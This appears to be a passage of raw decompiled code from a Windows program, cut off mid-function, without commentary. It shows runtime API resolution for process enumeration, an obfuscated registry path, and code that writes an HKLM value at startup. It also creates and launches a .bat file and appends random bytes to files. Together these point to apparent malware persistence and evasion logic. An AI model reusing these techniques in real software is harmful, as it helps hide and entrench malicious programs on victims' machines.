                    // WARNING: Could not recover jumptable at 0x0041306c. Too many branches
                    // WARNING: Treating indirect jump as call
  InternetOpenA();
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_004130ac(void)

{
  HMODULE in_EAX;
  
  if (DAT_00419880 == (HMODULE)0x0) {
    in_EAX = GetModuleHandleA(s_kernel32_dll_00413208);
    DAT_00419880 = in_EAX;
    if (in_EAX != (HMODULE)0x0) {
      DAT_00419884 = GetProcAddress(in_EAX,s_CreateToolhelp32Snapshot_00413218);
      _DAT_00419888 = GetProcAddress(DAT_00419880,s_Heap32ListFirst_00413234);
      _DAT_0041988c = GetProcAddress(DAT_00419880,s_Heap32ListNext_00413244);
      _DAT_00419890 = GetProcAddress(DAT_00419880,s_Heap32First_00413254);
      _DAT_00419894 = GetProcAddress(DAT_00419880,s_Heap32Next_00413260);
      _DAT_00419898 = GetProcAddress(DAT_00419880,s_Toolhelp32ReadProcessMemory_0041326c);
      DAT_0041989c = GetProcAddress(DAT_00419880,s_Process32First_00413288);
      DAT_004198a0 = GetProcAddress(DAT_00419880,s_Process32Next_00413298);
      _DAT_004198a4 = GetProcAddress(DAT_00419880,s_Process32FirstW_004132a8);
      _DAT_004198a8 = GetProcAddress(DAT_00419880,s_Process32NextW_004132b8);
      _DAT_004198ac = GetProcAddress(DAT_00419880,s_Thread32First_004132c8);
      _DAT_004198b0 = GetProcAddress(DAT_00419880,s_Thread32Next_004132d8);
      _DAT_004198b4 = GetProcAddress(DAT_00419880,s_Module32First_004132e8);
      _DAT_004198b8 = GetProcAddress(DAT_00419880,s_Module32Next_004132f8);
      _DAT_004198bc = GetProcAddress(DAT_00419880,s_Module32FirstW_00413308);
      in_EAX = (HMODULE)GetProcAddress(DAT_00419880,s_Module32NextW_00413318);
      _DAT_004198c0 = in_EAX;
    }
  }
  if ((DAT_00419880 != (HMODULE)0x0) && (DAT_00419884 != (FARPROC)0x0)) {
    return CONCAT31((int3)((uint)in_EAX >> 8),1);
  }
  return 0;
}



undefined4 FUN_00413328(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_004130ac();
  if ((char)uVar1 != '\0') {
    uVar1 = (*DAT_00419884)();
    return uVar1;
  }
  return 0;
}



undefined4 FUN_00413348(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_004130ac();
  if ((char)uVar1 != '\0') {
    uVar1 = (*DAT_0041989c)();
    return uVar1;
  }
  return 0;
}



undefined4 FUN_00413368(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_004130ac();
  if ((char)uVar1 != '\0') {
    uVar1 = (*DAT_004198a0)();
    return uVar1;
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00413388(void)

{
  undefined4 uVar1;
  undefined4 *in_FS_OFFSET;
  undefined auStack_10 [12];
  
  uVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = auStack_10;
  _DAT_0041987c = _DAT_0041987c + 1;
  *in_FS_OFFSET = uVar1;
  return;
}



void FUN_004134f0(undefined4 param_1)

{
  int iVar1;
  undefined4 local_c;
  undefined local_8;
  
  local_8 = 0xb;
  local_c = param_1;
  iVar1 = FUN_0040a9f0((int)PTR_DAT_00413428,'\x01',(int **)PTR_PTR_DAT_0041858c,0,&local_c);
  FUN_00403abc(iVar1);
  return;
}



undefined4 FUN_0041351c(char *param_1)

{
  if ((param_1 != (char *)0x0) && (*param_1 == '\\')) {
    return 0;
  }
  return CONCAT31((int3)((uint)param_1 >> 8),1);
}



undefined4 FUN_00413530(char param_1)

{
  if (param_1 == '\x01') {
    return 1;
  }
  if (param_1 == '\x02') {
    return 2;
  }
  if (param_1 == '\x03') {
    return 4;
  }
  if (param_1 != '\x04') {
    return 0;
  }
  return 3;
}



undefined4 FUN_00413560(int param_1)

{
  undefined3 uVar2;
  undefined4 uVar1;
  
  uVar2 = (undefined3)((uint)param_1 >> 8);
  if (param_1 == 1) {
    return CONCAT31(uVar2,1);
  }
  if (param_1 == 2) {
    uVar1 = CONCAT31(uVar2,2);
  }
  else if (param_1 == 4) {
    uVar1 = CONCAT31(uVar2,3);
  }
  else if (param_1 == 3) {
    uVar1 = CONCAT31(uVar2,4);
  }
  else {
    uVar1 = 0;
  }
  return uVar1;
}



int * FUN_00413588(int *param_1,char param_2,undefined4 param_3)

{
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_004037f0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_2 = extraout_DL;
  }
  FUN_00413628((int)param_1,(HKEY)0x80000001);
  param_1[6] = 0xf003f;
  *(undefined *)(param_1 + 3) = 1;
  if (param_2 != '\0') {
    FUN_00403848(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



void FUN_004135f8(int param_1)

{
  HKEY hKey;
  
  hKey = *(HKEY *)(param_1 + 4);
  if (hKey != (HKEY)0x0) {
    if (*(char *)(param_1 + 0xc) == '\0') {
      RegFlushKey(hKey);
    }
    else {
      RegCloseKey(hKey);
    }
    *(undefined4 *)(param_1 + 4) = 0;
    FUN_0040405c((int *)(param_1 + 0x10));
  }
  return;
}



void FUN_00413628(int param_1,HKEY param_2)

{
  if (param_2 != *(HKEY *)(param_1 + 8)) {
    if (*(char *)(param_1 + 0x14) != '\0') {
      RegCloseKey(*(HKEY *)(param_1 + 8));
      *(undefined *)(param_1 + 0x14) = 0;
    }
    *(HKEY *)(param_1 + 8) = param_2;
    FUN_004135f8(param_1);
  }
  return;
}



void FUN_00413654(int param_1,undefined4 param_2,undefined4 *param_3)

{
  FUN_004135f8(param_1);
  *(undefined4 *)(param_1 + 4) = param_2;
  FUN_004040b0((int *)(param_1 + 0x10),param_3);
  return;
}



int FUN_00413678(int param_1,char param_2)

{
  if ((*(int *)(param_1 + 4) != 0) && (param_2 != '\0')) {
    return *(int *)(param_1 + 4);
  }
  return *(int *)(param_1 + 8);
}



void FUN_0041368c(int param_1,int param_2,char param_3)

{
  undefined4 uVar1;
  LPCSTR pCVar2;
  HKEY pHVar3;
  int iVar4;
  byte bVar5;
  LPSECURITY_ATTRIBUTES *in_FS_OFFSET;
  DWORD Reserved;
  LPSTR lpClass;
  DWORD dwOptions;
  REGSAM RVar6;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  HKEY *ppHVar7;
  DWORD *lpdwDisposition;
  _SECURITY_ATTRIBUTES _Stack_28;
  DWORD local_14;
  LPSECURITY_ATTRIBUTES local_10;
  HKEY local_c;
  undefined local_6;
  char local_5;
  
  _Stack_28.bInheritHandle = (BOOL)&stack0xfffffffc;
  local_10 = (LPSECURITY_ATTRIBUTES)0x0;
  _Stack_28.lpSecurityDescriptor = &LAB_00413791;
  _Stack_28.nLength = (DWORD)*in_FS_OFFSET;
  *in_FS_OFFSET = &_Stack_28;
  local_5 = param_3;
  FUN_004040f4((int *)&local_10,param_2);
  uVar1 = FUN_0041351c((char *)local_10);
  bVar5 = (byte)uVar1;
  if (bVar5 == 0) {
    FUN_00404598((int *)&local_10,1,1);
  }
  local_c = (HKEY)0x0;
  if ((local_5 == '\0') || (local_10 == (LPSECURITY_ATTRIBUTES)0x0)) {
    ppHVar7 = &local_c;
    RVar6 = *(REGSAM *)(param_1 + 0x18);
    lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
    pCVar2 = FUN_004044f8((undefined *)local_10);
    pHVar3 = (HKEY)FUN_00413678(param_1,bVar5);
    iVar4 = RegOpenKeyExA(pHVar3,pCVar2,(DWORD)lpSecurityAttributes,RVar6,ppHVar7);
  }
  else {
    lpdwDisposition = &local_14;
    ppHVar7 = &local_c;
    lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
    RVar6 = *(REGSAM *)(param_1 + 0x18);
    dwOptions = 0;
    lpClass = (LPSTR)0x0;
    Reserved = 0;
    pCVar2 = FUN_004044f8((undefined *)local_10);
    pHVar3 = (HKEY)FUN_00413678(param_1,bVar5);
    iVar4 = RegCreateKeyExA(pHVar3,pCVar2,Reserved,lpClass,dwOptions,RVar6,lpSecurityAttributes,
                            ppHVar7,lpdwDisposition);
  }
  local_6 = iVar4 == 0;
  if ((bool)local_6) {
    if ((*(int *)(param_1 + 4) != 0 & bVar5) != 0) {
      lpSecurityAttributes = local_10;
      FUN_004043b8((int *)&local_10,3);
    }
    FUN_00413654(param_1,local_c,&local_10->nLength);
  }
  *in_FS_OFFSET = lpSecurityAttributes;
  FUN_0040405c((int *)&local_10);
  return;
}



bool FUN_004137b0(int param_1,undefined *param_2,undefined4 *param_3)

{
  LPCSTR lpValueName;
  LSTATUS LVar1;
  undefined4 uVar2;
  LPDWORD lpReserved;
  undefined4 **lpType;
  LPBYTE lpData;
  LPDWORD lpcbData;
  undefined4 *local_14;
  
  lpType = &local_14;
  local_14 = param_3;
  FUN_00402e48(param_3,8,0);
  lpcbData = param_3 + 1;
  lpData = (LPBYTE)0x0;
  lpReserved = (LPDWORD)0x0;
  lpValueName = FUN_004044f8(param_2);
  LVar1 = RegQueryValueExA(*(HKEY *)(param_1 + 4),lpValueName,lpReserved,(LPDWORD)lpType,lpData,
                           lpcbData);
  uVar2 = FUN_00413560((int)local_14);
  *(char *)param_3 = (char)uVar2;
  return LVar1 == 0;
}



void FUN_00413800(int param_1,undefined *param_2,undefined *param_3)

{
  int iVar1;
  DWORD DVar2;
  BYTE *pBVar3;
  char cVar4;
  
  iVar1 = FUN_004042f8((int)param_3);
  DVar2 = iVar1 + 1;
  cVar4 = '\x01';
  pBVar3 = FUN_004044f8(param_3);
  FUN_004138a4(param_1,param_2,pBVar3,cVar4,DVar2);
  return;
}



void FUN_0041382c(int param_1,undefined *param_2,BYTE *param_3,DWORD param_4)

{
  FUN_004138a4(param_1,param_2,param_3,'\x04',param_4);
  return;
}



DWORD FUN_00413840(int param_1,undefined *param_2,LPBYTE param_3,int param_4)

{
  bool bVar1;
  char local_14;
  DWORD local_10;
  char local_9;
  LPBYTE local_8;
  
  local_8 = param_3;
  bVar1 = FUN_004137b0(param_1,param_2,(undefined4 *)&local_14);
  if (bVar1) {
    local_9 = local_14;
    if (((local_14 == '\x04') || (local_14 == '\0')) && ((int)local_10 <= param_4)) {
      FUN_0041390c(param_1,param_2,local_8,&local_9,local_10);
    }
    else {
      FUN_004134f0(param_2);
    }
  }
  else {
    local_10 = 0;
  }
  return local_10;
}



void FUN_004138a4(int param_1,undefined *param_2,BYTE *param_3,char param_4,DWORD param_5)

{
  DWORD dwType;
  LPCSTR lpValueName;
  LSTATUS LVar1;
  int iVar2;
  DWORD Reserved;
  BYTE *lpData;
  undefined *local_10;
  undefined local_c;
  BYTE *local_8;
  
  local_8 = param_3;
  dwType = FUN_00413530(param_4);
  Reserved = 0;
  lpData = local_8;
  lpValueName = FUN_004044f8(param_2);
  LVar1 = RegSetValueExA(*(HKEY *)(param_1 + 4),lpValueName,Reserved,dwType,lpData,param_5);
  if (LVar1 != 0) {
    local_c = 0xb;
    local_10 = param_2;
    iVar2 = FUN_0040a9f0((int)PTR_DAT_00413428,'\x01',(int **)PTR_PTR_DAT_004185e0,0,&local_10);
    FUN_00403abc(iVar2);
  }
  return;
}



DWORD FUN_0041390c(int param_1,undefined *param_2,LPBYTE param_3,undefined *param_4,DWORD param_5)

{
  DWORD DVar1;
  LPCSTR lpValueName;
  LSTATUS LVar2;
  int iVar3;
  undefined4 uVar4;
  LPDWORD lpReserved;
  DWORD *lpType;
  DWORD *lpcbData;
  undefined *local_10;
  undefined local_c;
  DWORD local_8;
  
  local_8 = 0;
  lpcbData = &param_5;
  lpType = &local_8;
  lpReserved = (LPDWORD)0x0;
  lpValueName = FUN_004044f8(param_2);
  LVar2 = RegQueryValueExA(*(HKEY *)(param_1 + 4),lpValueName,lpReserved,lpType,param_3,lpcbData);
  if (LVar2 != 0) {
    local_c = 0xb;
    local_10 = param_2;
    iVar3 = FUN_0040a9f0((int)PTR_DAT_00413428,'\x01',(int **)PTR_PTR_DAT_004186f4,0,&local_10);
    FUN_00403abc(iVar3);
  }
  DVar1 = param_5;
  uVar4 = FUN_00413560(local_8);
  *param_4 = (char)uVar4;
  return DVar1;
}



void FUN_004142f4(int param_1,int param_2,int *param_3)

{
  byte bVar1;
  byte bVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  byte *pbVar6;
  int iVar7;
  int local_18;
  byte local_14 [4];
  
  uVar3 = FUN_004042f8(param_1);
  FUN_00404628(param_3,uVar3);
  iVar7 = 1;
  local_18 = 1;
  iVar5 = local_18;
  while( true ) {
    local_18 = iVar5;
    iVar5 = FUN_004042f8(param_1);
    if (iVar5 <= iVar7) break;
    iVar5 = 4;
    pbVar6 = local_14;
    do {
      iVar4 = FUN_004042f8(param_1);
      if (iVar4 < iVar7) {
        *pbVar6 = 0x40;
      }
      else {
        bVar1 = *(byte *)(param_1 + -1 + iVar7);
        if ((bVar1 < 0x21) || (0x7f < bVar1)) {
          *pbVar6 = 0x40;
        }
        else {
          *pbVar6 = *(byte *)(param_2 + -0x21 + (uint)bVar1);
        }
      }
      iVar7 = iVar7 + 1;
      pbVar6 = pbVar6 + 1;
      iVar5 = iVar5 + -1;
    } while (iVar5 != 0);
    iVar5 = thunk_FUN_00404504(param_3);
    bVar1 = local_14[2];
    *(byte *)(iVar5 + -1 + local_18) =
         (char)((local_14[0] & 0xffffff3f) << 2) + ((local_14[1] & 0x30) >> 4);
    iVar5 = local_18 + 1;
    if (local_14[2] != 0x40) {
      iVar5 = thunk_FUN_00404504(param_3);
      bVar2 = local_14[3];
      *(byte *)(iVar5 + -1 + local_18 + 1) =
           (char)((local_14[1] & 0xffffff0f) << 4) + ((bVar1 & 0x3c) >> 2);
      iVar5 = local_18 + 2;
      if (local_14[3] != 0x40) {
        iVar5 = thunk_FUN_00404504(param_3);
        *(byte *)(iVar5 + -1 + local_18 + 2) =
             (char)((local_14[2] & 0xffffff03) << 6) + (bVar2 & 0x3f);
        iVar5 = local_18 + 3;
      }
    }
  }
  FUN_00404628(param_3,local_18 - 1);
  return;
}



void FUN_00414424(void)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  undefined *local_1c;
  undefined4 *local_18;
  undefined *local_14;
  undefined4 *local_10;
  undefined4 *local_c;
  undefined4 *local_8;
  
  puStack_20 = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  local_c = (undefined4 *)0x0;
  local_10 = (undefined4 *)0x0;
  local_14 = (undefined *)0x0;
  local_18 = (undefined4 *)0x0;
  local_1c = (undefined *)0x0;
  puStack_24 = &LAB_00414509;
  uStack_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_28;
  FUN_0040c104(s_SystemRoot_0041451c,(int *)&local_8);
  FUN_00404344(&DAT_004198e0,local_8,(undefined4 *)s__system32__00414530);
  FUN_0040c104(s_ProgramFiles_00414544,(int *)&local_c);
  FUN_00404344(&DAT_004198e4,local_c,(undefined4 *)s__Internet_Explorer__0041455c);
  FUN_004029bc(0,(int *)&local_14);
  FUN_00407908(local_14,(int *)&local_10);
  FUN_004040b0(&DAT_004198e8,local_10);
  FUN_004029bc(0,(int *)&local_1c);
  FUN_00407880(local_1c,(int *)&local_18);
  FUN_004040b0((int *)&DAT_004198ec,local_18);
  FUN_004029bc(0,&DAT_004198f0);
  FUN_004079fc(DAT_004198ec);
  FUN_004040b0(&DAT_004198f4,(undefined4 *)s_Windows_ces_00414578);
  FUN_00417448();
  *in_FS_OFFSET = uStack_28;
  puStack_20 = &LAB_00414510;
  puStack_24 = (undefined *)0x414508;
  FUN_00404080((int *)&local_1c,6);
  return;
}



void FUN_004145b8(undefined *param_1,undefined *param_2)

{
  undefined *puVar1;
  char cVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined *puStack_4c;
  undefined *puStack_48;
  char *pcStack_44;
  undefined *puStack_40;
  undefined *puStack_3c;
  undefined *puStack_38;
  char *pcStack_34;
  undefined4 uStack_30;
  undefined *puStack_2c;
  undefined *puStack_28;
  int local_18;
  int local_14;
  int local_10;
  undefined *local_c;
  undefined *local_8;
  
  local_10 = 0;
  local_14 = 0;
  local_18 = 0;
  puStack_28 = (undefined *)0x4145d3;
  local_c = param_2;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_28 = (undefined *)0x4145db;
  FUN_004044e8((int)local_c);
  puStack_2c = &LAB_004146c7;
  uStack_30 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_30;
  pcStack_34 = (char *)0x4145fb;
  puStack_28 = &stack0xfffffffc;
  FUN_004142f4(0x41474c,0x4146e0,&local_10);
  pcStack_34 = s__Begin_to_write_registry_at_stra_00414794;
  puStack_38 = local_8;
  puStack_3c = &DAT_004147c8;
  puStack_40 = local_c;
  pcStack_44 = (char *)0x414618;
  FUN_004043b8(&local_14,4);
  pcStack_44 = (char *)0x414620;
  FUN_00417448();
  puStack_48 = &LAB_0041467d;
  puStack_4c = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack_4c;
  pcStack_44 = &stack0xfffffffc;
  piVar3 = FUN_00413588((int *)PTR_DAT_00413488,'\x01',extraout_ECX);
  FUN_00413628((int)piVar3,(HKEY)0x80000002);
  cVar2 = FUN_0041368c((int)piVar3,local_10,'\x01');
  if (cVar2 != '\0') {
    FUN_00413800((int)piVar3,local_8,local_c);
    FUN_004135f8((int)piVar3);
  }
  FUN_004035a8(piVar3);
  puVar1 = local_c;
  *in_FS_OFFSET = puStack_4c;
  pcStack_44 = s__END_registry_at_startup_was_wri_004147d4;
  puStack_48 = local_8;
  puStack_4c = &DAT_004147c8;
  FUN_004043b8(&local_18,4);
  FUN_00417448();
  *in_FS_OFFSET = puVar1;
  puStack_48 = &LAB_004146ce;
  puStack_4c = (undefined *)0x4146c6;
  FUN_00404080(&local_18,5);
  return;
}



undefined4 FUN_00414800(int param_1,undefined *param_2,undefined4 param_3)

{
  char cVar1;
  int *piVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_34;
  undefined *puStack_30;
  undefined *puStack_2c;
  undefined4 uStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  undefined4 local_c;
  undefined4 local_8;
  
  puStack_20 = &stack0xfffffffc;
  local_c = 0;
  local_8 = 0;
  puStack_24 = &LAB_004148a0;
  uStack_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_28;
  puStack_2c = (undefined *)0x414835;
  piVar2 = FUN_00413588((int *)PTR_DAT_00413488,'\x01',param_3);
  puStack_2c = (undefined *)0x414845;
  FUN_00413628((int)piVar2,(HKEY)0x80000002);
  puStack_2c = (undefined *)0x414851;
  cVar1 = FUN_0041368c((int)piVar2,param_1,'\0');
  if (cVar1 != '\0') {
    puStack_30 = &LAB_0041487c;
    uStack_34 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack_34;
    puStack_2c = &stack0xfffffffc;
    FUN_00413840((int)piVar2,param_2,(LPBYTE)&local_c,8);
    *in_FS_OFFSET = uStack_34;
    puStack_2c = (undefined *)0x41488e;
    FUN_004135f8((int)piVar2);
  }
  puStack_2c = (undefined *)0x414896;
  FUN_004035a8(piVar2);
  *in_FS_OFFSET = uStack_28;
  return local_c;
}



void FUN_004148b8(int param_1,undefined *param_2,undefined4 param_3,undefined param_4)

{
  char cVar1;
  int *piVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_1c;
  undefined *puStack_18;
  undefined *puStack_14;
  
  puStack_14 = &stack0xfffffffc;
  puStack_18 = &LAB_0041491f;
  uStack_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_1c;
  piVar2 = FUN_00413588((int *)PTR_DAT_00413488,'\x01',param_3);
  FUN_00413628((int)piVar2,(HKEY)0x80000002);
  cVar1 = FUN_0041368c((int)piVar2,param_1,'\x01');
  if (cVar1 != '\0') {
    FUN_0041382c((int)piVar2,param_2,&param_4,8);
    FUN_004135f8((int)piVar2);
  }
  FUN_004035a8(piVar2);
  *in_FS_OFFSET = uStack_1c;
  return;
}



undefined4 FUN_00414930(undefined param_1,undefined param_2,undefined param_3,undefined8 param_4)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00402a44();
  return uVar1;
}



void FUN_0041497c(undefined *param_1)

{
  LPCSTR pCVar1;
  undefined *puVar2;
  undefined4 uVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 *in_FS_OFFSET;
  undefined4 *puVar4;
  DWORD DVar5;
  undefined4 uStack_2fc;
  undefined *puStack_2f8;
  undefined *puStack_2f4;
  undefined *local_2f0;
  undefined *local_2ec;
  undefined *local_2e8;
  undefined *local_2e4;
  undefined *local_2e0;
  undefined4 local_2dc [64];
  undefined4 local_1dc [115];
  undefined *local_10;
  undefined *local_c;
  undefined *local_8;
  
  local_2f0 = (undefined *)0x0;
  local_2ec = (undefined *)0x0;
  local_2e8 = (undefined *)0x0;
  local_2e4 = (undefined *)0x0;
  local_2e0 = (undefined *)0x0;
  local_c = (undefined *)0x0;
  local_10 = (undefined *)0x0;
  puStack_2f4 = (undefined *)0x4149b6;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_2f8 = &LAB_00414bd4;
  uStack_2fc = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_2fc;
  puStack_2f4 = &stack0xfffffffc;
  FUN_004079f0((int *)&local_10);
  FUN_004078b4(local_8,(int *)&local_2e0);
  pCVar1 = FUN_004044f8(local_2e0);
  SetCurrentDirectoryA(pCVar1);
  FUN_00407908(local_8,(int *)&local_c);
  FUN_0040606c(local_2dc,0x100);
  DVar5 = 0x100;
  puVar4 = local_2dc;
  pCVar1 = FUN_004044f8(local_c);
  GetShortPathNameA(pCVar1,(LPSTR)puVar4,DVar5);
  CharToOemA((LPCSTR)local_2dc,(LPSTR)local_2dc);
  FUN_004042cc((int *)&local_c,local_2dc,0x100);
  FUN_00402d28(local_1dc,PTR_s___202803s_bat_004184d4);
  FUN_00402ac4((undefined *)local_1dc);
  FUN_00402784();
  puVar2 = (undefined *)FUN_0040468c((undefined *)local_1dc,&DAT_00414be8);
  FUN_004030c8(puVar2,extraout_EDX,extraout_ECX);
  FUN_00402784();
  FUN_004043b8((int *)&local_2e4,3);
  puVar2 = (undefined *)FUN_0040468c((undefined *)local_1dc,local_2e4);
  FUN_004030c8(puVar2,extraout_EDX_00,extraout_ECX_00);
  FUN_00402784();
  FUN_004043b8((int *)&local_2e8,3);
  puVar2 = (undefined *)FUN_0040468c((undefined *)local_1dc,local_2e8);
  FUN_004030c8(puVar2,extraout_EDX_01,extraout_ECX_01);
  FUN_00402784();
  FUN_004043b8((int *)&local_2ec,3);
  puVar2 = (undefined *)FUN_0040468c((undefined *)local_1dc,local_2ec);
  FUN_004030c8(puVar2,extraout_EDX_02,extraout_ECX_02);
  FUN_00402784();
  FUN_00402df0((undefined *)local_1dc);
  FUN_00402784();
  FUN_0040606c(local_2dc,0x100);
  DVar5 = 0x100;
  puVar4 = local_2dc;
  pCVar1 = FUN_004044f8(PTR_s___202803s_bat_004184d4);
  GetShortPathNameA(pCVar1,(LPSTR)puVar4,DVar5);
  FUN_004042cc((int *)&local_2f0,local_2dc,0x100);
  uVar3 = FUN_00407708(local_2f0);
  if ((char)uVar3 != '\0') {
    WinExec((LPCSTR)local_2dc,0);
  }
  pCVar1 = FUN_004044f8(local_10);
  SetCurrentDirectoryA(pCVar1);
  *in_FS_OFFSET = &DAT_00414c08;
  FUN_00404080((int *)&local_2f0,5);
  FUN_00404080((int *)&local_10,3);
  return;
}



undefined FUN_00414c34(undefined *param_1,undefined4 param_2,undefined4 param_3)

{
  undefined uVar1;
  int iVar2;
  undefined4 uVar3;
  undefined2 extraout_var;
  undefined4 extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined *puStack_24;
  undefined *puStack_20;
  undefined *puStack_1c;
  int *local_10;
  int *local_c;
  undefined local_5;
  
  local_5 = 0;
  puStack_1c = (undefined *)0x414c4e;
  local_10 = (int *)FUN_00403578((int *)PTR_PTR_LAB_004100b4,'\x01',param_3);
  puStack_1c = (undefined *)0x414c56;
  FUN_00402a1c();
  puStack_1c = (undefined *)0x414c60;
  iVar2 = FUN_00402e68(0x20d0);
  puStack_1c = (undefined *)0x414c72;
  (**(code **)(*local_10 + 4))(local_10,iVar2 + 0x200);
  puStack_1c = (undefined *)0x414c79;
  uVar3 = FUN_00407708(param_1);
  if ((char)uVar3 != '\0') {
    puStack_20 = &LAB_00414cf6;
    puStack_24 = (undefined *)*in_FS_OFFSET;
    *in_FS_OFFSET = &puStack_24;
    puStack_1c = &stack0xfffffffc;
    local_c = FUN_004121e4((int *)PTR_PTR_LAB_0040ffc4,'\x01',param_1,0x21);
    (**(code **)(*local_10 + 0x14))(local_10,0,0);
    (**(code **)(*local_c + 0x14))(local_c,0,CONCAT22(extraout_var,2));
    uVar3 = 0;
    FUN_0041202c(local_c,local_10,extraout_ECX,0,0);
    (**(code **)(*local_c + 0x10))(local_c,&local_10,iVar2 + 0x200);
    *in_FS_OFFSET = uVar3;
    puStack_24 = &DAT_00414cfd;
    FUN_004035a8(local_c);
    uVar1 = FUN_004035a8(local_10);
    return uVar1;
  }
  return local_5;
}



undefined FUN_00414d0c(undefined *param_1,int *param_2)

{
  undefined uVar1;
  undefined4 uVar2;
  undefined4 extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_24;
  undefined *puStack_20;
  undefined *puStack_1c;
  int local_10;
  int *local_c;
  undefined local_5;
  
  local_5 = 0;
  puStack_1c = (undefined *)0x414d23;
  uVar2 = FUN_00407708(param_1);
  if ((char)uVar2 != '\0') {
    puStack_20 = &LAB_00414da5;
    uStack_24 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack_24;
    puStack_1c = &stack0xfffffffc;
    local_c = FUN_004121e4((int *)PTR_PTR_LAB_0040ffc4,'\x01',param_1,0x21);
    (**(code **)(*param_2 + 0x14))(param_2,0,0);
    (**(code **)(*local_c + 0x18))(local_c,1,*local_c,2,0);
    uVar2 = 0;
    FUN_0041202c(local_c,param_2,extraout_ECX,0,0);
    local_10 = (**(code **)*param_2)();
    local_10 = local_10 + 4;
    (**(code **)(*local_c + 0x10))(local_c,&local_10,4);
    *in_FS_OFFSET = uVar2;
    uVar1 = FUN_004035a8(local_c);
    return uVar1;
  }
  return local_5;
}



void FUN_00414dbc(undefined *param_1,int param_2)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_34;
  undefined *puStack_30;
  undefined *puStack_2c;
  undefined4 uStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  int local_10;
  undefined local_9;
  undefined *local_8;
  
  local_10 = 0;
  puStack_20 = (undefined *)0x414dd7;
  local_8 = param_1;
  FUN_004044e8((int)param_1);
  puStack_24 = &LAB_00414ecb;
  uStack_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_28;
  local_9 = 1;
  puStack_2c = (undefined *)0x414df5;
  puStack_20 = &stack0xfffffffc;
  piVar1 = (int *)FUN_00403578((int *)PTR_PTR_LAB_004100b4,'\x01',extraout_ECX);
  puStack_2c = (undefined *)0x414e03;
  piVar2 = (int *)FUN_00403578((int *)PTR_PTR_LAB_0040fdc4,'\x01',extraout_ECX_00);
  puStack_2c = (undefined *)0x414e0a;
  FUN_00402a1c();
  puStack_2c = (undefined *)0x414e14;
  iVar3 = FUN_00402e68(0x37);
  iVar3 = iVar3 + 1;
  if (param_2 == 1) {
    if (0 < iVar3) {
      do {
        puStack_2c = (undefined *)0x414e2d;
        iVar4 = FUN_00402e68(0x1a);
        puStack_2c = (undefined *)0x414e3c;
        FUN_00404300(&local_10,(undefined4 *)(&PTR_DAT_004183e0)[iVar4]);
        iVar3 = iVar3 + -1;
      } while (iVar3 != 0);
    }
  }
  else if ((param_2 == 2) && (0 < iVar3)) {
    do {
      puStack_2c = (undefined *)0x414e51;
      iVar4 = FUN_00402e68(0x1a);
      puStack_2c = (undefined *)0x414e60;
      FUN_00404300(&local_10,(undefined4 *)(&PTR_DAT_004183e0)[iVar4]);
      iVar3 = iVar3 + -1;
    } while (iVar3 != 0);
  }
  puStack_30 = &LAB_00414e9f;
  uStack_34 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_34;
  puStack_2c = &stack0xfffffffc;
  (**(code **)(*piVar2 + 0x2c))(piVar2,local_10);
  (**(code **)(*piVar2 + 0x78))(piVar2,piVar1);
  FUN_00414d0c(local_8,piVar1);
  FUN_004035a8(piVar1);
  *in_FS_OFFSET = uStack_34;
  *in_FS_OFFSET = uStack_28;
  puStack_20 = &LAB_00414ed2;
  puStack_24 = (undefined *)0x414ec2;
  FUN_0040405c(&local_10);
  puStack_24 = (undefined *)0x414eca;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_00414edc(undefined *param_1,int param_2)

{
  char cVar1;
  undefined4 extraout_ECX;
  undefined4 uVar2;
  undefined4 extraout_ECX_00;
  undefined4 extraout_EDX;
  undefined4 uVar3;
  undefined4 extraout_EDX_00;
  undefined4 *in_FS_OFFSET;
